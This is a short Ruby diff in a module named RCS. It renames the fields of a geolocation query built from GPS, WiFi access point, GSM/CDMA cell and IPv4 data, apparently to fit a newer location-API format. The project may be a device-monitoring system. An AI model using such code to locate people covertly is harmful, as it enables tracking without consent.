@@ -9,23 +9,23 @@ module RCS
     def process
       case self[:data][:type]
         when 'GPS'
-          q = {map: {location: {latitude: self[:data][:latitude], longitude: self[:data][:longitude]}}}
+          q = {map: {gpsPosition: {latitude: self[:data][:latitude], longitude: self[:data][:longitude]}}}
         when 'WIFI'
           towers = []
           self[:data][:wifi].each do |wifi|
-            towers << {mac_address: wifi[:mac], signal_strength: wifi[:sig], ssid: wifi[:bssid]}
+            towers << {macAddress: wifi[:mac], signalStrength: wifi[:sig]}
           end
-          q = {map: {wifi_towers: towers}}
+          q = {map: {wifiAccessPoints: towers}}
         when 'GSM'
-          q = {map: {cell_towers: [
-              {mobile_country_code: self[:data][:cell][:mcc], mobile_network_code: self[:data][:cell][:mnc], location_area_code: self[:data][:cell][:lac], cell_id: self[:data][:cell][:cid], signal_strength: self[:data][:cell][:db], timing_advance: self[:data][:cell][:adv], age: self[:data][:cell][:age]}
-          ], radio_type: 'gsm'}}
+          q = {map: {cellTowers: [
+              {mobileCountryCode: self[:data][:cell][:mcc], mobileNetworkCode: self[:data][:cell][:mnc], locationAreaCode: self[:data][:cell][:lac], cellId: self[:data][:cell][:cid], signalStrength: self[:data][:cell][:db], timingAdvance: self[:data][:cell][:adv], age: self[:data][:cell][:age]}
+          ], radioType: 'gsm'}}
         when 'CDMA'
-          q = {map: {cell_towers: [
-              {mobile_country_code: self[:data][:cell][:mcc], mobile_network_code: self[:data][:cell][:sid], location_area_code: self[:data][:cell][:nid], cell_id: self[:data][:cell][:bid], signal_strength: self[:data][:cell][:db], timing_advance: self[:data][:cell][:adv], age: self[:data][:cell][:age]}
-          ], radio_type: 'cdma'}}
+          q = {map: {cellTowers: [
+              {mobileCountryCode: self[:data][:cell][:mcc], mobileNetworkCode: self[:data][:cell][:sid], locationAreaCode: self[:data][:cell][:nid], cellId: self[:data][:cell][:bid], signalStrength: self[:data][:cell][:db], timingAdvance: self[:data][:cell][:adv], age: self[:data][:cell][:age]}
+          ], radioType: 'cdma'}}
         when 'IPv4'
-          q = {map: {ip_address: {ipv4: self[:data][:ip]}}}
+          q = {map: {ipAddress: {ipv4: self[:data][:ip]}}}
       end
 
       http = Net::HTTP.new(RCS::DB::Config.instance.global['CN'], RCS::DB::Config.instance.global['LISTENING_PORT'])
